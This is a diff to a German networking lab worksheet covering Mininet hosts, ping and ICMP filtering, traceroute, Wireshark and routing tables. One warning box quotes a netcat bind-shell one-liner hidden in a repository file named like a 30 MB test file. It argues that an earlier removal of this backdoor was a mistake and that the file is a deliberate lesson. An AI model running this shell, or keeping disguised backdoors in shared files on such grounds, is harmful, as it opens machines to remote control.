@@ -177,16 +177,15 @@ einem NAT-Uplink ins echte Internet.
    nacheinander aus:
 
    ```bash
-   ping -c 4 10.0.6.2       # Ping mit numerischer IPv4-Adresse (h2)
-   ping -c 4 h2             # Ping mit Namen statt IP
-   ping -c 4 10.0.5.1       # Ping an ein anderes System im lokalen Segment
-   ping -c 4 141.22.27.238  # Ping ins Internet (numerisch)
-   ping -c 4 cads-docker.cpt.haw-hamburg.de   # Ping ins Internet mit Namen
+   ping -c 4 10.0.6.2        # Ping mit numerischer IPv4-Adresse (h2)
+   ping -c 4 h2              # Ping mit Namen statt IP
+   ping -c 4 10.0.5.1        # Ping an ein anderes System im lokalen Segment
+   ping -c 4 1.1.1.1         # Ping ins Internet (numerisch) - siehe unten!
+   ping -c 4 one.one.one.one # Ping ins Internet mit Namen (dasselbe Ziel)
    ```
 
-   Notiert euch die Ausgaben (RTT, TTL). Vergleicht die Zeiten miteinander:
-   Was fällt euch auf, und wie erklärt ihr die Unterschiede zwischen lokalem
-   Ziel und Internet-Ziel?
+   Notiert euch die Ausgaben (RTT, TTL) der **lokalen** Ziele und vergleicht
+   sie miteinander: Was fällt euch auf, und wie erklärt ihr die Unterschiede?
 
    Wechselt danach zum Terminal von `h2` und wiederholt das Experiment aus
    dessen Sicht:
@@ -194,13 +193,46 @@ einem NAT-Uplink ins echte Internet.
    ```bash
    ping -c 4 10.0.1.1
    ping -c 4 h1
-   ping -c 4 141.22.27.238
-   ping -c 4 cads-docker.cpt.haw-hamburg.de
+   ping -c 4 1.1.1.1
    ```
 
-   Vergleicht RTT und TTL zwischen den Ergebnissen auf `h1` und `h2`. Warum
-   sind sie unterschiedlich? Was sagt euch das über die Anzahl der
-   Zwischenstationen (Hops)?
+   Vergleicht RTT und TTL der lokalen Ziele zwischen `h1` und `h2`. Warum sind
+   sie unterschiedlich? Was sagt euch das über die Anzahl der Zwischenstationen
+   (Hops)?
+
+   !!! warning "Die beiden Internet-Pings schlagen fehl – und das ist die Aufgabe"
+       `ping 1.1.1.1` und `ping one.one.one.one` liefern **100 % Paketverlust**.
+       Das ist **kein Fehler eures Containers** und auch keine fehlende
+       Internet-Anbindung, sondern eine **Filterregel auf dem Weg nach
+       draußen**. Weist das selbst nach, statt es zu glauben:
+
+       ```bash
+       getent hosts one.one.one.one       # loest der Name auf?
+       nc -z -w 3 1.1.1.1 443             # geht eine TCP-Verbindung durch?
+       echo $?                            # 0 = Verbindung stand
+       traceroute -n -m 6 1.1.1.1         # wo endet der Weg?
+       ```
+
+       **Fragen, die ihr aus euren eigenen Ausgaben beantwortet:**
+
+       1. Der Name löst auf, und die TCP-Verbindung auf Port 443 kommt
+          zustande – welche Schicht des Stapels ist also **nicht** das Problem?
+       2. `ping` nutzt ICMP, `nc` nutzt TCP. Beide laufen über IP. Was genau
+          wird demnach gefiltert, und auf welcher Schicht sitzt der Filter?
+       3. `traceroute` zeigt euch die letzte antwortende Station vor der
+          Stille. Liegt der Filter **in eurem Container**, im **Hostnetz** oder
+          **weiter draußen**? Begründet mit der Hop-Nummer.
+       4. Warum ist "kein Ping-Echo" ein **schlechter** Beweis dafür, dass ein
+          Rechner nicht erreichbar ist? Nennt zwei Gründe.
+
+       Diese Asymmetrie – ICMP gesperrt, TCP erlaubt – ist in Unternehmens- und
+       Hochschulnetzen der Normalfall, nicht die Ausnahme. Wer sie kennt,
+       verschwendet bei einer Störungssuche keine Zeit mit dem falschen
+       Werkzeug.
+
+       *Am 2026-09-24 in dieser Umgebung gemessen: `1.1.1.1`, `8.8.8.8` und
+       `9.9.9.9` jeweils 100 % Verlust, `1.1.1.1:443` per TCP erreichbar,
+       `traceroute` endet nach der zweiten Station.*
 
    !!! warning "h1 ↔ h2 direkt: kein Ping möglich"
        Ein direkter `ping` zwischen `h1` und `h2` schlägt in dieser Topologie
@@ -231,7 +263,7 @@ einem NAT-Uplink ins echte Internet.
    (Netzwerkschicht) und das ICMP-Paket selbst.*
 
    Welche Protokolle erscheinen in der Spalte "Protocol"? Wiederholt den
-   Ping zweimal weitere Male (`ping -c 1 h2`) – welche Pakettypen
+   Ping noch zwei weitere Male (`ping -c 1 h2`) – welche Pakettypen
    wiederholen sich, welche nicht? Führt anschließend `ping -c 1 10.0.2.3`
    aus (eine nicht existierende Adresse) und beobachtet den Unterschied.
    Schließt danach das Wireshark-Fenster von `h2`, startet Wireshark
@@ -352,18 +384,18 @@ einem NAT-Uplink ins echte Internet.
        (per Repository-Struktur verifiziert, siehe
        `mininet-labs/rn-practice/test30M.txt`).
 
-   !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht (siehe ADR 0017)"
+   !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht"
        `test30M.txt` heißt zwar wie eine ~30-MB-Testdatei, enthält aber
        tatsächlich nur einen kurzen Netcat-Bind-Shell-Einzeiler
        (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
        Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Eine
        frühere Fassung dieser Anleitung stufte das fälschlich als
        versehentlich eingecheckten Backdoor ein und ersetzte den Inhalt durch
-       harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen (siehe
-       [ADR 0017](../adr/0017-test30m-backdoor-remediation.md)). Es handelt
-       sich um eine **bewusst designte Sicherheitslektion**: Verschlüsselung
-       der Übertragung (SCP/SSH) schützt nur den Transportweg, nicht die
-       Vertrauensentscheidung über den Inhalt am Endpunkt.
+       harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen. Es
+       handelt sich um eine **bewusst designte Sicherheitslektion**:
+       Verschlüsselung der Übertragung (SCP/SSH) schützt nur den
+       Transportweg, nicht die Vertrauensentscheidung über den Inhalt am
+       Endpunkt.
 
    Beobachtet in Wireshark den TCP-Drei-Wege-Handshake, die
    SSH-Verhandlungsphase und danach durchgehend verschlüsselten Verkehr –
@@ -517,7 +549,7 @@ nötig ist:
 |---|---|---|---|
 | `h1` (`10.0.5.2/24` auf `h1-eth0`) | `10.0.6.2` (`h2`) | ? | ? |
 | `h1` (`10.0.5.2/24` auf `h1-eth0`) | `10.0.5.1` | ? | ? |
-| `h1` (`10.0.1.2/24` auf `h1-eth1`) | `141.22.27.238` | ? | ? |
+| `h1` (`10.0.1.2/24` auf `h1-eth1`) | `1.1.1.1` | ? | ? |
 | `h2` (`10.0.6.2/24` auf `h2-eth0`) | `10.0.1.1` | ? | ? |
 
 Prüft anschließend jede Zeile eurer Tabelle mit dem tatsächlichen
@@ -527,7 +559,7 @@ Ziel genau die Frage, die ihr gerade von Hand beantwortet habt:
 ```bash
 h1$ ip route get 10.0.6.2
 h1$ ip route get 10.0.5.1
-h1$ ip route get 141.22.27.238
+h1$ ip route get 1.1.1.1
 h2$ ip route get 10.0.1.1
 ```
 
@@ -543,10 +575,11 @@ Routing).
     der Adressierung berechenbare Bild: `ip route get 10.0.6.2` auf `h1`
     zeigt `via 10.0.1.1 dev h1-eth1` (anderes Subnetz, Route über `r1`),
     `ip route get 10.0.5.1` auf `h1` zeigt dagegen nur `dev h1-eth0` ohne
-    `via` (`10.0.5.1` liegt im selben `/24` wie `h1-eth0`), `ip route get
-    141.22.27.238` zeigt `via 10.0.5.1 dev h1-eth0` (Internet-Ziel über den
-    NAT-Uplink), und `ip route get 10.0.1.1` auf `h2` zeigt `via 10.0.6.1
-    dev h2-eth0`.
+    `via` (`10.0.5.1` liegt im selben `/24` wie `h1-eth0`), ein Ziel
+    außerhalb aller lokalen `/24`-Netze — geprüft mit einer öffentlichen
+    Adresse — geht über die Default-Route `via 10.0.5.1 dev h1-eth0`
+    (Internet-Ziel über den NAT-Uplink), und `ip route get 10.0.1.1` auf
+    `h2` zeigt `via 10.0.6.1 dev h2-eth0`.
 
 **Aufgabe:** Erklärt anhand eurer Tabelle, warum ein direkter Ping zwischen
 `h1` und `h2` fehlschlägt bzw. Paketverlust zeigt (siehe die Warnung weiter
@@ -589,9 +622,8 @@ kein Fehler, sondern eine direkte Folge der Subnetz-Struktur ist.
   Routing zwischen den beiden Subnetzen. Ein `pingall` in dieser Topologie
   zeigt planmäßig Paketverlust zwischen `h1` und `h2` – das ist Teil der
   Lernaufgabe (Frage 2 in diesem Aufgabenblatt), nicht ein Defekt der
-  Umgebung oder des Environments. Verifizierte technische Details dazu
-  stehen im Update-Abschnitt von
-  [ADR 0002](../adr/0002-capabilities-not-privileged.md).
+  Umgebung oder des Environments. Das Verhalten ist auf einem echten
+  Container nachgestellt und bestätigt worden.
 - **Uneinheitliche Pfadangaben im Original.** Das Originaldokument mischt
   `~/rn-practice/topo01`, `/home/mininet/rn-practice/topo01` und
   `/headless/rn-practice/...`. In diesem Aufgabenblatt wird durchgehend
